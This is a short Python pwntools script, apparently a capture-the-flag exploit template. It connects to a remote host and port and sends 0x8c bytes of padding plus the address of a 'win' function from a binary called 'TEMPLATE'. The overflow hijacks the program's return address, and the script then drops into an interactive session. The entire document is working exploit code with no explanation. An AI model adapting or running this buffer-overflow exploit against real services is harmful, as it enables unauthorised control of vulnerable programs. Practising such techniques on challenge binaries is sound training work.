#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], int(sys.argv[2]))
c.recvline()
c.send(b"A" * 0x8c + struct.pack("<I", pwn.ELF('TEMPLATE').symbols['win']) + b"\n")
c.interactive()
